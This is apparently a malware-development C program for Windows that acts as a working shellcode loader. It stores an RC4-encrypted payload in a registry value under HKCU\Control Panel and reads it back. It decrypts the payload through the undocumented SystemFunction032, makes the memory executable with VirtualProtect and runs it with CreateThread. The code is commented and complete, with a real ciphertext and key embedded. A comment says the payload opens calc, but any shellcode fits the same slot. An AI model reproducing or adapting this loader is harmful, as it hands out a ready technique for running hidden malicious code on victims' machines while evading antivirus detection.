#include <Windows.h>
#include <stdio.h>

#define REGISTRY "Control Panel"
#define REGSTRING "MaldevBy0xgu1"

// this is what SystemFunction032 function take as a parameter
typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}




BOOL WriteShellcode(IN PBYTE pShellcode, IN DWORD sSizeShellcode) {
	BOOL bState = TRUE;
	LSTATUS STATUS = NULL;
	HKEY hKey = NULL;

    printf("[*] Writing Registry.....\n\n");

    // Retrieve Handle to Registry
	STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
	if (ERROR_SUCCESS != STATUS) {
		printf("Error RegOpenKeyExA with: %d", GetLastError());
		bState = FALSE; goto _EndOfFunctions;
	}

    // Write Shellcode Encrypted on REGSTRING
	STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, sSizeShellcode);
	if (ERROR_SUCCESS != STATUS) {
		printf("Error RegSetValueExA with: %d", GetLastError());
		bState = FALSE; goto _EndOfFunctions;
	}

	printf("[*] DONE !\n\n");

_EndOfFunctions:
	if (hKey)
		RegCloseKey(hKey);
	return bState;
}


BOOL ReadShellcodeFromRegistry(OUT PBYTE* pPayload, OUT SIZE_T* sPayload) {

    LSTATUS STATUS = NULL;
    DWORD dwBytesRead = NULL;
    PVOID pBytes = NULL;

    printf("[*] Reading Shellcode from Registry...\n\n");

    // Retrieve Size of Shellcode
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("Error RegGetValueA: %d", GetLastError());
        return FALSE;
    }

    // Allocate memory for bytes of shellcode
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
    if (pBytes == NULL) {
        printf("Error Allocating Memory HeapAlloc: %d", GetLastError());
        return FALSE;
    }

    // Read Shellcode Encrypted from registry
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("Error Second RegGetValueA with: %d", GetLastError());
        return FALSE;
    }

    printf("[#] Payload Read at: 0x%p\n", pBytes);

    *pPayload = pBytes;
    *sPayload = dwBytesRead;

    printf("[*] Reading Successfull!\n\n");

    return TRUE;
}


unsigned char Rc4CipherText[] = {
        0xFD, 0x7A, 0xC1, 0x76, 0x36, 0x5F, 0x4F, 0x4D, 0x05, 0x01, 0x21, 0xCF, 0x25, 0x23, 0xD6, 0x64,
        0x34, 0x07, 0x9F, 0xF5, 0x8B, 0x54, 0xF5, 0x58, 0xDA, 0xEF, 0x55, 0x9D, 0xA2, 0xBF, 0x28, 0x88,
        0x48, 0xB5, 0xCE, 0x43, 0x25, 0x77, 0xC0, 0x78, 0xF7, 0xE0, 0x6E, 0xA9, 0x00, 0x3F, 0x41, 0xD0,
        0xDE, 0xB2, 0x7F, 0x7F, 0x76, 0xDF, 0x60, 0x91, 0xC7, 0x03, 0x2A, 0xEA, 0xAD, 0xDF, 0x85, 0x02,
        0x94, 0xFC, 0xFB, 0x12, 0x9C, 0x00, 0x51, 0xB4, 0xE1, 0x01, 0x96, 0xE3, 0x28, 0xEA, 0x8C, 0x00,
        0x92, 0xBE, 0x42, 0x83, 0xEA, 0xF3, 0x18, 0x1B, 0x44, 0x8F, 0x25, 0xD0, 0x24, 0x8F, 0x1C, 0x0B,
        0x29, 0x92, 0x32, 0xB0, 0x51, 0xE6, 0xF0, 0xD2, 0x5D, 0xF0, 0x84, 0xEF, 0x75, 0x0B, 0x5C, 0xDB,
        0x05, 0x12, 0x68, 0xE0, 0x70, 0xA4, 0xDC, 0xAA, 0xD3, 0x54, 0x35, 0xAC, 0x13, 0x42, 0x01, 0x36,
        0xC1, 0xE4, 0xD2, 0x47, 0x70, 0x00, 0x2E, 0x5B, 0x23, 0x31, 0xC0, 0x80, 0xC8, 0x2A, 0x7A, 0xE5,
        0x5C, 0xE7, 0x7E, 0xDF, 0x5F, 0x95, 0xA6, 0x28, 0x85, 0x60, 0x20, 0x27, 0xEA, 0xE2, 0x4A, 0x96,
        0xC8, 0x51, 0xAF, 0xF8, 0x76, 0x56, 0x75, 0x06, 0x48, 0x0A, 0x0C, 0x0C, 0x54, 0x70, 0x9E, 0xCC,
        0x0D, 0x1A, 0x90, 0x7B, 0xC6, 0xF8, 0xB5, 0x34, 0x5D, 0x47, 0x83, 0xE5, 0xB0, 0x4A, 0x8A, 0x8F,
        0xC9, 0x18, 0xB7, 0x6A, 0x83, 0x4F, 0x75, 0x79, 0xB7, 0x0D, 0xD6, 0xDD, 0x6C, 0x2A, 0x61, 0x00,
        0xF2, 0xC9, 0xEA, 0xD7, 0xD8, 0xB4, 0x13, 0x24, 0x4E, 0x4F, 0xC5, 0x72, 0x33, 0xBA, 0x6E, 0x81,
        0x07, 0xC6, 0xC0, 0x27, 0xFE, 0xC1, 0xF8, 0x79, 0x55, 0x10, 0x93, 0xBE, 0xF2, 0x41, 0x17, 0xCD,
        0xA7, 0xB5, 0xA8, 0x89, 0x5E, 0xEC, 0xA3, 0x28, 0xE2, 0xFD, 0xD9, 0x0A, 0x30, 0x4F, 0x35, 0x08,
        0x5D, 0x2E, 0xBC, 0xE0, 0x92, 0xD4, 0x7C, 0x71, 0x3C, 0xB7, 0x95, 0xAF, 0x06, 0xEB, 0xC0, 0xF5 };


unsigned char Rc4Key[] = {
        0xF2, 0x9A, 0x36, 0x9C, 0xF0, 0xD0, 0x48, 0x86, 0x0F, 0x1B, 0xB2, 0xA9, 0xBE, 0xFC, 0x7D, 0x3C };


BOOL ExecutePayload(IN PVOID pDecryptShellcode, IN SIZE_T sDecryptedShellcodeSize) {
    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = NULL;

    // Allocate Memory to Shellcode Desencrypted
    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("Error VirtualAlloc: %d", GetLastError());
        return FALSE;
    }

    // Copy Shellcode Desencrypted into memory
    memcpy(pShellcodeAddress, pDecryptShellcode, sDecryptedShellcodeSize);
    memset(pDecryptShellcode, '\0', sDecryptedShellcodeSize);

    printf("Allocated Payload at: 0x%p \n", pShellcodeAddress);

    // Change Memory Protection to EXECUTE_READWRITE
    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("Error Virtual Protect: %d", GetLastError());
        return FALSE;
    }

    printf("Payload Ready to Execute ! \n\n");
    printf("Press Enter To Run...\n");
    getchar();

    // CreateThread for executed Shellcode (cacl.exe)
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("Error Failed CreateThread: %d", GetLastError());
        return FALSE;
    }

    return TRUE;
}


int main() {
    PBYTE  pPayload = NULL;
    SIZE_T sPayload = NULL;

    if (!WriteShellcode(Rc4CipherText, sizeof(Rc4CipherText))) {
        printf("Error Write to Shellcode on Registry");
        return -1;
    }

    if (!ReadShellcodeFromRegistry(&pPayload, &sPayload)) {
        printf("Error Read Shellcode from Registry");
        return -1;
    }

    if (!Rc4EncryptionViSystemFunc032(Rc4Key, pPayload, sizeof(Rc4Key), sPayload)) {
        printf("Error Decrypting Shellcode");
        return -1;
    }

    if (!ExecutePayload(pPayload, sPayload)) {
        printf("Error Execute Shellcode");
        return -1;
    }

    HeapFree(GetProcessHeap, 0, pPayload);
    printf("[*] Press Enter to quit");
    getchar();
    return 0;
}